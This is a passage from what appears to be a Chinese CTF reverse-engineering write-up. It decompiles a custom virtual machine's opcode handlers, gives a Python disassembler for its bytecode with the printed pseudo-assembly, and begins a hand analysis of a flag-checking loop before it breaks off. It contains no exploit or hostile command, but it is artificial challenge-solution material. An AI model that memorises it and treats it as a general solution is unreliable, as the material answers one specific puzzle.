class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F2</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = OPCODE[a1[<span class="number">6</span>] + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v2 )                                     <span class="comment">// 出栈</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        a1[<span class="number">1</span>] = tmp[a1[<span class="number">7</span>]--];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        a1[<span class="number">2</span>] = tmp[a1[<span class="number">7</span>]--];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        a1[<span class="number">3</span>] = tmp[a1[<span class="number">7</span>]--];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = tmp[a1[<span class="number">7</span>]--];</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(a1[<span class="number">6</span>] + <span class="number">2</span>);</span><br><span class="line">  a1[<span class="number">6</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F3:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF7D1EE14D0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">1</span>] )   <span class="comment">// 寄存器运算</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) += *(_DWORD *)(a1</span><br><span class="line">                                                                             + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) -= *(_DWORD *)(a1</span><br><span class="line">                                                                             + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) *= *(_DWORD *)(a1</span><br><span class="line">                                                                             + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) ^= *(_DWORD *)(a1</span><br><span class="line">                                                                             + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) &lt;&lt;= *(_DWORD *)(a1</span><br><span class="line">                                                                              + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) &amp;= <span class="number">0xFF00</span>u;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>]) &gt;&gt;= *(_DWORD *)(a1</span><br><span class="line">                                                                              + <span class="number">4</span>i64 * OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">4</span>);</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F4:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 == *(_DWORD *)(a1 + <span class="number">4</span>) )   <span class="comment">// reg0==reg1</span></span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">32</span>) = <span class="number">0</span>;                    <span class="comment">// 比较位</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 != *(_DWORD *)(a1 + <span class="number">4</span>) )</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">32</span>) = <span class="number">1</span>;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">1</span>);</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F5:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F5</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">                                                <span class="comment">// pc = opcode[pc+1]</span></span><br><span class="line">  result = OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F6:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">32</span>) )                    <span class="comment">// 比较位是1： 不相等 不跳转</span></span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">else</span>                                          <span class="comment">// 相等 跳转</span></span><br><span class="line">    result = OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F7:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F7</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">32</span>) )                    <span class="comment">// 不相等 跳转</span></span><br><span class="line">    result = OPCODE[*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">2</span>);</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印bytecode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x32</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x64</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x28</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x5F</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x96</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x28</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x63</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">pc = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> opcode[pc] != <span class="number">0xFF</span>:</span><br><span class="line">    op = opcode[pc]</span><br><span class="line">    <span class="keyword">if</span>(op==<span class="number">0</span>):</span><br><span class="line">        v2 = opcode[pc+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(v2):</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    mov input[reg2] reg0&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">2</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    mov reg<span class="subst">&#123;opcode[pc+<span class="number">2</span>]&#125;</span> reg<span class="subst">&#123;opcode[pc+<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">3</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    mov reg<span class="subst">&#123;opcode[pc+<span class="number">2</span>]&#125;</span> <span class="subst">&#123;opcode[pc+<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    mov reg0 input[reg2]&quot;</span>)</span><br><span class="line">        pc += <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">1</span>):</span><br><span class="line">        v2 = opcode[pc+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(v2):</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    push reg0&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">2</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    push reg2&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">3</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    push reg3&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    push reg0&quot;</span>)</span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">2</span>):</span><br><span class="line">        v2 = opcode[pc+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span>(v2):</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    pop reg1&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">2</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    pop reg2&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(v2==<span class="number">3</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    pop reg3&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    pop reg0&quot;</span>)</span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">3</span>):</span><br><span class="line">        v1 = opcode[pc+<span class="number">1</span>]</span><br><span class="line">        v2 = opcode[pc+<span class="number">2</span>]</span><br><span class="line">        v3 = opcode[pc+<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    add reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    sub reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">2</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    mul reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">3</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    xor reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">4</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    shl reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>\n      and reg<span class="subst">&#123;v2&#125;</span> 0xFF00u&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(v1==<span class="number">5</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    shr reg<span class="subst">&#123;v2&#125;</span> reg<span class="subst">&#123;v3&#125;</span>&quot;</span>)</span><br><span class="line">        pc += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    cmp reg0 reg1&quot;</span>)</span><br><span class="line">        pc += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">5</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    jmp <span class="subst">&#123;opcode[pc+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># pc = opcode[pc+1]</span></span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    je <span class="subst">&#123;opcode[pc+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span>(op==<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pc&#125;</span>    jne <span class="subst">&#123;opcode[pc+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        pc += <span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打印出来是这个样子:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>    mov reg2 <span class="number">0</span></span><br><span class="line"><span class="number">4</span>    add reg2 reg3</span><br><span class="line"><span class="number">8</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="number">12</span>    mov reg1 reg0</span><br><span class="line"><span class="number">16</span>    mov reg2 <span class="number">50</span></span><br><span class="line"><span class="number">20</span>    add reg2 reg3</span><br><span class="line"><span class="number">24</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="number">28</span>    add reg1 reg0</span><br><span class="line"><span class="number">32</span>    mov reg2 <span class="number">100</span></span><br><span class="line"><span class="number">36</span>    add reg2 reg3</span><br><span class="line"><span class="number">40</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="number">44</span>    <span class="keyword">xor</span> reg1 reg0</span><br><span class="line"><span class="number">48</span>    mov reg0 <span class="number">8</span></span><br><span class="line"><span class="number">52</span>    mov reg2 reg1</span><br><span class="line"><span class="number">56</span>    shl reg1 reg0</span><br><span class="line">      <span class="keyword">and</span> reg1 <span class="number">0xFF00</span>u</span><br><span class="line"><span class="number">60</span>    shr reg2 reg0</span><br><span class="line"><span class="number">64</span>    add reg1 reg2</span><br><span class="line"><span class="number">68</span>    mov reg0 reg1</span><br><span class="line"><span class="number">72</span>    push reg0</span><br><span class="line"><span class="number">74</span>    mov reg0 <span class="number">1</span></span><br><span class="line"><span class="number">78</span>    add reg3 reg0</span><br><span class="line"><span class="number">82</span>    mov reg0 reg3</span><br><span class="line"><span class="number">86</span>    mov reg1 <span class="number">40</span></span><br><span class="line"><span class="number">90</span>    cmp reg0 reg1</span><br><span class="line"><span class="number">91</span>    je <span class="number">95</span></span><br><span class="line"><span class="number">93</span>    jmp <span class="number">0</span></span><br><span class="line"><span class="number">95</span>    mov reg3 <span class="number">0</span></span><br><span class="line"><span class="number">99</span>    pop reg1</span><br><span class="line"><span class="number">101</span>    mov reg2 <span class="number">150</span></span><br><span class="line"><span class="number">105</span>    add reg2 reg3</span><br><span class="line"><span class="number">109</span>    mov reg0 input[reg2]</span><br><span class="line"><span class="number">113</span>    cmp reg0 reg1</span><br><span class="line"><span class="number">114</span>    jne <span class="number">136</span></span><br><span class="line"><span class="number">116</span>    mov reg0 <span class="number">1</span></span><br><span class="line"><span class="number">120</span>    add reg3 reg0</span><br><span class="line"><span class="number">124</span>    mov reg0 reg3</span><br><span class="line"><span class="number">128</span>    mov reg1 <span class="number">40</span></span><br><span class="line"><span class="number">132</span>    cmp reg0 reg1</span><br><span class="line"><span class="number">133</span>    jne <span class="number">99</span></span><br></pre></td></tr></table></figure><p>然后就慢慢手撕汇编吧<br>分析如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个loop 0~93 循环40次</span></span><br><span class="line"><span class="number">0</span>     mov reg2 <span class="number">0</span></span><br><span class="line"><span class="number">4</span>     add reg2 reg3</span><br><span class="line"><span class="number">8</span>     